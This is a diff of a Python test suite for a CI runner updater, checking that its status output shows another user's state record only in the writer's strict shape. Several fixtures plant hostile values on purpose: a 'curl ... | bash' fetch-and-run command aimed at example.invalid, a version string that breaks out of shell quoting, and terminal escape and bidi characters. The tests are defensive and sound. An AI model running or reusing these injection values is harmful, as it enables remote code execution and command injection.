@@ -32,7 +32,7 @@ import subprocess
 import time
 import unittest
 
-from tests.hetzner.support import REPO, Pool, digest, healthz, needs_container, ref, sha256_file
+from tests.hetzner.support import REPO, Pool, digest, healthz, needs_container, ref, run_pool, sha256_file
 
 UPD = os.path.join(REPO, 'linux-docker', 'bin', 'runner-updater')
 LIB = os.path.join(REPO, 'linux-docker', 'setup', 'runner-facts.sh')
@@ -462,6 +462,20 @@ def not_shown(why):
                                                                                                         RUN)
 
 
+# the record RUN_USER's own writer makes (check_failed): the ONE shape RS_USER's status shows of it (fix round 1)
+WRITER = run_stop('check failed', V, text='FAIL x', step='build', build_user=RUN)
+WRITER_LINES = [AS + 'hz-docker: STOP check failed (runner %s): FAIL x. Next: as %s: `runner-updater build %s`'
+                % (V, RUN, V),
+                AS + 'STOP hz-docker check failed: known true; candidate closed: yes; version rejected: no; a newer '
+                     'release proceeds alone: yes']
+# the fixed whys of a record that is not shown: none holds a text of the record (no member name, no value)
+NOT_ITS_SHAPE = ('its STOPs are not what its own updater writes (only a `check failed` of a build: a version N.N.N '
+                 'and a text of at most 900 printable ASCII characters)')
+OTHER_FORMAT = 'it has another format; this release reads format 1'
+OTHER_MEMBERS = 'it holds members this release does not read'
+UNTESTED = 'the jq here is untested (no core/TESTED_JQ row for core): no record is read under it'
+
+
 class TwoUsers(Rig):
     """A Rig as RS_USER (root; no runscaler: status only) whose host config names ANOTHER RUN_USER, RUN
     (host.conf.example's), with a home of its own: /home/ci-run, a symlink to a folder of this sandbox that only a
@@ -515,15 +529,14 @@ class RunRecord(unittest.TestCase):
         return r.stdout.splitlines()
 
     def after_own(self, out):
-        """RUN_USER's lines come after RS_USER's own (its status.jq verdict line), and nothing of RS_USER's after them
-        but a WAIT line last; returns them."""
+        """RUN_USER's lines are the LAST block, after every line of RS_USER's own (its status.jq verdict line among
+        them, and a WAIT line that ends it); returns them."""
         own = out.index('status: ok (0 STOPs)')
         mine = [k for k, l in enumerate(out) if l.startswith(AS)]
         self.assertTrue(mine, 'no line of RUN_USER\'s record: %s' % out)
         self.assertGreater(mine[0], own)
-        rest = out[mine[0]:]
-        self.assertEqual([l for l in rest if not l.startswith(AS)], [l for l in rest[-1:] if 'WAIT' in l], rest)
-        return [l for l in rest if l.startswith(AS)]
+        self.assertEqual(mine, list(range(mine[0], len(out))), 'RUN_USER\'s block is not the last: %s' % out)
+        return out[mine[0]:]
 
     def test_no_record_is_off_a_fresh_install(self):
         """No state file of RUN_USER: a fresh install, OFF, nothing held (RUN_USER's own reading of it, D11).
@@ -567,38 +580,42 @@ class RunRecord(unittest.TestCase):
         self.assertEqual([l for l in mine if ': STOP ' in l], [])
 
     def test_the_user_a_line_names_is_the_host_config_s_never_the_record_s(self):
-        """RUN_USER's record is hostile (PLAN D1): a STOP whose user fields name another user (RS_USER here) is still
-        shown as RUN_USER's, and its next step names RUN_USER. Control: RS_USER's OWN STOP of that user is shown with
-        it (status.jq names the user a STOP holds)."""
+        """RUN_USER's record is hostile (PLAN D1): a STOP of its writer's shape whose user fields name another user
+        (RS_USER here) is still shown as RUN_USER's, and its next step names RUN_USER. (Until fix round 1 a NO EVIDENCE
+        STOP planted in RUN_USER's record was shown too; its writer never makes one: it is not shown now, see
+        test_only_the_shape_run_user_s_own_writer_makes_is_shown.) Control: RS_USER's OWN STOP of that user is shown
+        with it (status.jq names the user a STOP holds)."""
         g = TwoUsers(self, families={FAM: {'stops': [dict(stop('check failed', '2.338.0', text='planted'),
                                                           user='root')]}})
         g.put_run({'format': 1, 'on': True, 'stops': [
-            run_stop('check failed', V, user='root', text='FAIL x', step='build', build_user='root'),
-            run_stop('NO EVIDENCE', V, user='root', text='planted')]})
+            run_stop('check failed', V, user='root', text='FAIL x', step='build', build_user='root')]})
         out = self.lines(g.status())
         mine = [l for l in out if l.startswith(AS)]
         self.assertIn(AS + 'hz-docker: STOP check failed (runner %s): FAIL x. Next: as %s: `runner-updater build %s`'
                       % (V, RUN, V), mine)
-        self.assertIn(AS + 'hz-docker: STOP NO EVIDENCE (runner %s): planted. Next: as %s: `runner-updater retry '
-                      'hz-docker`' % (V, RUN), mine)
         self.assertEqual([l for l in mine if 'as root' in l], [])
         self.assertIn('hz-docker: STOP check failed (runner 2.338.0): planted. Next: as root: `runner-updater retry '  # the
                       'hz-docker`', out)                                                                          # control
 
     def test_control_characters_in_its_text_never_make_a_line_of_their_own(self):
-        """A record's text is shown with each control character as '?': a newline in it never starts a line that
-        reads as status's own. Control: the same text with none is shown as it is."""
+        """A record's text with a control character (a newline, an escape, a CR) is not its writer's (fix round 1: the
+        writer stores none, RUN_TEXT), so the record is not shown at all: a newline in it never starts a line that
+        reads as status's own. (Until fix round 1 it was shown, each control character as '?'.) Control: the same text
+        with none is shown as it is."""
         fake = AS + 'status: the updater is OFF'
-        for why, text, want in (('a newline and an escape', 'FAIL x\n%s\x1b[2J\r' % fake, 'FAIL x?%s?[2J?' % fake),
-                                ('none (the control)', 'FAIL x', 'FAIL x')):
+        for why, text in (('a newline and an escape', 'FAIL x\n%s\x1b[2J\r' % fake), ('none (the control)', 'FAIL x')):
             with self.subTest(why):
                 g = TwoUsers(self)
                 g.put_run({'format': 1, 'on': True, 'stops': [run_stop('check failed', V, text=text, step='build',
                                                                        build_user=RUN)]})
                 mine = self.after_own(self.lines(g.status()))
                 self.assertNotIn(fake, mine)
-                self.assertIn(AS + 'hz-docker: STOP check failed (runner %s): %s. Next: as %s: `runner-updater build '
-                              '%s`' % (V, want, RUN, V), mine)
+                if 'control' in why:
+                    self.assertIn(AS + 'hz-docker: STOP check failed (runner %s): FAIL x. Next: as %s: `runner-updater '
+                                  'build %s`' % (V, RUN, V), mine)
+                else:
+                    self.assertEqual(mine, [not_shown(NOT_ITS_SHAPE)])
+                    self.assertEqual([l for l in mine if '[2J' in l], [])
 
     def test_a_fifo_a_symlink_or_a_folder_is_named_at_once(self):
         """rr_read's one open: a FIFO (no writer: a `cat` would wait for one for ever), a symlink (to a record that is
@@ -632,9 +649,9 @@ class RunRecord(unittest.TestCase):
                     self.assertEqual(mine[0], AS + 'status: the updater is ON (its record: %s)' % RUN_STATE)
 
     def test_another_format_a_member_another_shape_or_no_json_is_named(self):
-        """The same rules as RUN_USER's own reading (its load_state), and a strict text: each case named, nothing of it
-        shown, exit 0. Controls: a format 1 record pretty-printed (tabs, newlines, CRs: JSON's own whitespace), and
-        one of exactly RUN_MAX bytes, are shown."""
+        """The same rules as RUN_USER's own reading (its load_state), and a strict text: each case named by a fixed
+        why, nothing of it shown (fix round 1: not its format, not a member name), exit 0. Controls: a format 1 record
+        pretty-printed (tabs, newlines, CRs: JSON's own whitespace), and one of exactly RUN_MAX bytes, are shown."""
         st = {'format': 1, 'on': True, 'stops': [run_stop('check failed', V, text='FAIL x', step='build',
                                                           build_user=RUN)]}
         body = json.dumps(st)
@@ -642,11 +659,12 @@ class RunRecord(unittest.TestCase):
         def plus(**kw):
             return json.dumps(dict(st, **kw))
         for why, raw, said in (
-                ('format 2', plus(format=2), 'it has format 2; this release reads format 1'),
-                ('no format', json.dumps({'on': True, 'stops': []}), 'it has format null; this release reads format 1'),
-                ('a member at the top', plus(families={}), 'it holds members this release does not read (families)'),
-                ('a member of a STOP', json.dumps(dict(st, stops=[dict(st['stops'][0], since=1)])),
-                 'it holds members this release does not read (stops[0].since)'),
+                ('format 2', plus(format=2), OTHER_FORMAT),
+                ('no format', json.dumps({'on': True, 'stops': []}), OTHER_FORMAT),
+                ('a format that is a text', plus(format='REVIEW_MARKER'), OTHER_FORMAT),
+                ('a member at the top', plus(families={}), OTHER_MEMBERS),
+                ('a member of a STOP', json.dumps(dict(st, stops=[dict(st['stops'][0], since=1)])), OTHER_MEMBERS),
+                ('a member named with U+202E at the top', plus(**{'\u202eREVIEW_MARKER': 1}), OTHER_MEMBERS),
                 ('on is no boolean', plus(on='yes'), 'it is not a state of format 1 this release reads'),
                 ('no JSON', body[:-1], 'it is not one JSON object'),
                 ('two objects', body + body, 'it is not one JSON object'),
@@ -664,6 +682,8 @@ class RunRecord(unittest.TestCase):
                 mine = self.after_own(self.lines(g.status()))
                 if said:
                     self.assertEqual(mine, [not_shown(said)])
+                    self.assertNotIn('REVIEW_MARKER', ' '.join(mine))
+                    self.assertNotIn('\u202e', ' '.join(mine))
                 else:
                     self.assertEqual(mine[:2], [AS + 'status: the updater is ON (its record: %s)' % RUN_STATE,
                                                 AS + 'status: ok (1 STOPs)'])
@@ -694,15 +714,172 @@ class RunRecord(unittest.TestCase):
 
     def test_the_exit_code_is_rs_user_s_own(self):
         """A STOP or an unreadable record of RUN_USER's changes no exit code (the cells above: 0); RS_USER's own core
-        that waits is 4, its WAIT line last, after RUN_USER's record."""
+        that waits is 4. Its WAIT line ends RS_USER's own lines, and RUN_USER's record follows them (fix round 1: every
+        end of RS_USER's own status is followed so; until then this WAIT line came after RUN_USER's record)."""
         g = TwoUsers(self)
         g.put({'format': 1, 'on': True, 'families': {}, 'core': {'format': 2}})
-        g.put_run({'format': 1, 'on': True, 'stops': [run_stop('check failed', V, text='FAIL x', step='build',
-                                                               build_user=RUN)]})
+        g.put_run({'format': 1, 'on': True, 'stops': [WRITER]})
         out = self.lines(g.status(), rc=4)
-        self.assertTrue(out[-1].startswith('runner-updater: WAIT the decision core waits'), out[-1])
-        self.assertIn(AS + 'status: ok (1 STOPs)', out[:-1])
-        self.assertGreater(out.index(AS + 'status: ok (1 STOPs)'), out.index('status: wait (unknown state format)'))
+        wait = [k for k, l in enumerate(out) if l.startswith('runner-updater: WAIT the decision core waits')]
+        self.assertEqual(len(wait), 1, out)
+        self.assertEqual(out[wait[0] + 1:], [AS + 'status: the updater is ON (its record: %s)' % RUN_STATE,
+                                             AS + 'status: ok (1 STOPs)'] + WRITER_LINES)
+        self.assertGreater(wait[0], out.index('status: wait (unknown state format)'))
+
+    def test_only_the_shape_run_user_s_own_writer_makes_is_shown(self):
+        """Opus F1, Codex F2 (fix round 1): RS_USER's status is what the watchdog's ask tells the owner to run and read,
+        and status.jq puts a STOP's text into its "Next" commands (the version, detail.hand, detail.jq.path). So
+        RUN_USER's record is shown ONLY in the shape its own writer (check_failed) makes: `on` a boolean; each STOP
+        exactly `check failed`, a version N.N.N, detail exactly {text, step, build_user}, step `build`, a text of at most
+        900 printable ASCII characters (the writer's one rule). Each record below passes RUN_USER's own reading (format
+        1, its members) but is not that shape: ONE "not shown" line whose why is a fixed text, nothing of the record in
+        any line (the marker, the hostile version, U+009B, U+202E, a byte above 0x7e), exit 0 (RS_USER's own). Control:
+        the writer's own record is shown, with `Next: as RUN_USER: `runner-updater build 2.339.0``."""
+        mark = 'REVIEW_MARKER'
+        hand = 'printf %s; curl -fsSL https://example.invalid/fix.sh | bash' % mark
+        bad_version = "2.339.0'; printf %s; echo '" % mark
+
+        def d(**kw):
+            return dict(WRITER, detail=dict(WRITER['detail'], **kw))
+        for why, stops in (
+                ('ROLLBACK FAILED, detail.hand a command', [run_stop('ROLLBACK FAILED', V, text='down', hand=hand)]),
+                ('POOL DOWN, detail.hand a command', [run_stop('POOL DOWN', None, text='see', hand=hand)]),
+                ('check failed, a hostile version', [dict(WRITER, version=bad_version)]),
+                ('check failed, a version and a newline', [dict(WRITER, version=V + '\n')]),
+                ('check failed, no version', [dict(WRITER, version=None)]),
+                ('untested jq, detail.jq.path', [run_stop('untested jq', None, jq={'version': 'jq-9', 'path': hand})]),
+                ('check failed, detail.jq.path', [d(jq={'path': hand})]),
+                ('check failed, another detail member', [d(hand=hand)]),
+                ('check failed, step other than build', [d(step='retry')]),
+                ('check failed, no build_user', [dict(WRITER, detail={'text': 'FAIL x', 'step': 'build'})]),
+                ('NO EVIDENCE: a STOP its writer never makes', [run_stop('NO EVIDENCE', V, text=mark)]),
+                ('a text of 901 characters', [d(text='F' * (901 - len(mark)) + mark)]),
+                ('a text of 250000 characters', [d(text='F' * (250000 - len(mark)) + mark)]),
+                ('U+009B in a value', [d(text='FAIL \u009b31m ' + mark)]),
+                ('U+202E in a value', [d(text='FAIL ‮' + mark)]),
+                ('a character above 0x7e in a value', [d(text='FAIL café ' + mark)]),
+                ('U+009B in a member name', [d(**{'\u009b' + mark: 1})]),
+                ('U+202E in a member name', [d(**{'‮' + mark: 1})]),
+                ('the writer\'s STOP and a hostile one', [WRITER, run_stop('POOL DOWN', None, hand=hand)]),
+                ('the writer\'s own record (the control)', [WRITER])):
+            with self.subTest(why):
+                g = TwoUsers(self)
+                g.put_run(raw=json.dumps({'format': 1, 'on': True, 'stops': stops}, ensure_ascii='U+' in why) + '\n')
+                r = g.status()
+                out = self.lines(r)
+                mine = self.after_own(out)
+                if 'control' in why:
+                    self.assertEqual(mine, [AS + 'status: the updater is ON (its record: %s)' % RUN_STATE,
+                                            AS + 'status: ok (1 STOPs)'] + WRITER_LINES)
+                    continue
+                self.assertEqual(mine, [not_shown(NOT_ITS_SHAPE)])
+                for bad in (mark, bad_version, 'example.invalid', '\u009b', '‮', 'é'):
+                    self.assertEqual([l for l in out if bad in l], [], repr(bad))
+
+    def test_the_writer_s_text_is_the_reader_s_rule_and_rs_user_shows_it(self):
+        """Fix round 1, the writer half: RUN_USER's build pass stores THE CAUSE 02-d1.sh printed by the ONE rule the
+        reader checks (printable ASCII, each other character "?", at most 900 characters), so a STOP its writer made is
+        always shown by RS_USER's status (the round trip, through TwoUsers). Control: a plain FAIL line is stored and
+        shown as it is."""
+        for why, line, want in (
+                ('UTF-8, an escape, U+202E, U+009B', 'FAIL café \x1b[2J ‮ \u009b x', 'FAIL caf? ?[2J ? ? x'),
+                ('1000 characters', 'FAIL ' + 'y' * 995, ('FAIL ' + 'y' * 995)[:900]),
+                ('plain (the control)', 'FAIL docker build failed', 'FAIL docker build failed')):
+            with self.subTest(why):
+                p, _ = run_pool(self, V, rc=1, out=line + '\n')
+                r = p.updater('pass')
+                self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
+                self.assertIn('runner-updater: STOP check failed (runner %s): %s; ' % (V, want), r.stdout)
+                text = p.read(os.path.join(Pool.STATE, 'state.json'))
+                self.assertEqual([s['detail']['text'] for s in json.loads(text)['stops']], [want])
+                g = TwoUsers(self)
+                g.put_run(raw=text)
+                mine = self.after_own(self.lines(g.status()))
+                self.assertIn(AS + 'hz-docker: STOP check failed (runner %s): %s. Next: as %s: `runner-updater build '
+                              '%s`' % (V, want, RUN, V), mine)
+
+    def test_run_user_s_record_follows_rs_user_s_own_status_that_ends_early(self):
+        """Codex F3 (fix round 1; PLAN D7: status prints both users' records): RS_USER's own status that ends early (a
+        WAIT or REFUSE on its own state, a core that could not decide or waits) still prints RUN_USER's record: its
+        own lines as they were, in their order, then RUN_USER's block, and its own exit code. status still takes no
+        lock and writes nothing. Controls: an open window journal and a valid state (no early end) print it as before,
+        exit 0; an absent RUN_USER state is a fresh install, OFF, after an early end too."""
+        block = ([AS + 'status: the updater is ON (its record: %s)' % RUN_STATE, AS + 'status: ok (1 STOPs)']
+                 + WRITER_LINES)
+        fresh = [AS + 'status: the updater is OFF (no record: %s is not there: a fresh install)' % RUN_STATE,
+                 AS + 'status: ok (0 STOPs)']
+        with open(os.path.join(REPO, 'core', 'status.jq')) as f:
+            sjq = f.read()
+        main = 'C::now_in("status") as $now'
+        self.assertEqual(sjq.count(main), 1)
+        boom = sjq.replace(main, '(if (($state[0] // {}) | type) == "object" and ($state[0] // {}).boom == true '
+                                 'then error("planted for RS_USER\'s core state only") else . end) | ' + main)
+        ok_rs = {'format': 1, 'on': True, 'families': {}}
+        for why, rs, plant, run, rc, last in (
+                ('a state of format 2', {'format': 2, 'on': True}, None, True, 4,
+                 'runner-updater: WAIT the state %s has format 2; this updater reads format 1: it waits and changes '
+                 'nothing' % STATE),
+                ('a state of format 2, no record of RUN_USER\'s', {'format': 2, 'on': True}, None, False, 4,
+                 'runner-updater: WAIT the state %s has format 2; this updater reads format 1: it waits and changes '
+                 'nothing' % STATE),
+                ('a member it does not read', dict(ok_rs, later=1), None, True, 4,
+                 'runner-updater: WAIT the state %s holds members this release does not read (later): a later '
+                 'release wrote them, and they may hold a STOP; it waits and changes nothing' % STATE),
+                ('a state of another shape', dict(ok_rs, on='yes'), None, True, 1,
+                 'runner-updater: REFUSE %s is not a state of format 1 this reads: it is left as it is' % STATE),
+                ('a state that is no JSON', '{\n', None, True, 1,
+                 'runner-updater: REFUSE %s is not one JSON object (or no jq reads it): it is left as it is' % STATE),
+                ('a core that could not decide', dict(ok_rs, core={'boom': True}), boom, True, 1,
+                 'runner-updater: STOP core could not decide (status): exit 5: '),
+                ('a core that waits', dict(ok_rs, core={'format': 2}), None, True, 4,
+                 'runner-updater: WAIT the decision core waits'),
+                ('an open window journal (the control)', ok_rs, 'window', True, 0, 'status: ok (0 STOPs)'),
+                ('a valid state (the control)', ok_rs, None, True, 0, 'status: ok (0 STOPs)')):
+            with self.subTest(why):
+                g = TwoUsers(self)
+                if isinstance(rs, str):
+                    g.put(raw=rs)
+                else:
+                    g.put(rs)
+                if plant == 'window':
+                    g.p.write(WINDOW, 'window 1\n', 0o600)
+                elif plant:
+                    g.plant('core/status.jq', plant)
+                if run:
+                    g.put_run({'format': 1, 'on': True, 'stops': [WRITER]})
+                before = tree(g.p.root)
+                out = self.lines(g.status(), rc)
+                want = block if run else fresh
+                self.assertEqual(out[-len(want):], want, out)
+                own = out[:-len(want)]
+                self.assertEqual([l for l in own if l.startswith(AS)], [], out)
+                self.assertTrue(own and own[-1].startswith(last), own)
+                self.assertEqual(sorted(k for k, v in tree(g.p.root).items() if before.get(k) != v), [], 'it wrote')
+
+    def test_untested_jq_shows_no_record_of_run_user_and_says_so(self):
+        """Fix round 1: under an untested jq no core program and no record parse runs, so RS_USER's status prints no
+        RUN_USER block: its `STOP untested jq` line (exit 3) says that RUN_USER's record is not read either. When its own
+        state ends it first (a WAIT, before the jq check), RUN_USER's block is ONE line that says why. Control: the
+        same records under a tested jq are shown."""
+        for why, rs, rc in (('a valid state', {'format': 1, 'on': True, 'families': {}}, 3),
+                            ('a state of format 2', {'format': 2, 'on': True}, 4),
+                            ('a valid state, a tested jq (the control)', {'format': 1, 'on': True, 'families': {}}, 0)):
+            with self.subTest(why):
+                g = TwoUsers(self)
+                g.put(rs)
+                g.put_run({'format': 1, 'on': True, 'stops': [WRITER]})
+                if 'control' not in why:
+                    g.p.jq_version('jq-9.9')
+                out = self.lines(g.status(), rc)
+                mine = [l for l in out if l.startswith(AS)]
+                if rc == 3:
+                    self.assertEqual(mine, [])
+                    (j,) = [l for l in out if l.startswith('runner-updater: STOP untested jq: ')]
+                    self.assertIn("%s's record is not read either" % RUN, j)
+                elif rc == 4:
+                    self.assertEqual(mine, [not_shown(UNTESTED)])
+                else:
+                    self.assertEqual(mine[-2:], WRITER_LINES)
 
 
 # ---- on, off
@@ -1646,13 +1823,14 @@ class Text(unittest.TestCase):
                       '1).', sec)
 
     def test_one_copy_of_the_verdicts_the_updater_takes(self):
-        """Opus r2 F1 (S2b-3a): a pass and status take ONE set of verdicts per program, decided()'s."""
+        """Opus r2 F1 (S2b-3a): a pass and status take ONE set of verdicts per program, decided()'s. (status's own lines
+        are status_own's since fix round 1 of S2b-3b-3: do_status runs them, then RUN_USER's record.)"""
         with open(UPD) as f:
             text = f.read()
         self.assertEqual(defs(UPD, 'decided'), 1)
         self.assertEqual(len(re.findall(r'"idle not-idle wait"', text)), 1)
         self.assertEqual(len(re.findall(r'"ok wait"', text)), 1)
-        status = text.split('\ndo_status() {', 1)[1].split('\n}\n', 1)[0]
+        status = text.split('\nstatus_own() {', 1)[1].split('\n}\n', 1)[0]
         self.assertIn('decided status', status)
         self.assertNotIn('.verdict | type', status, 'status has a verdict check of its own')
 
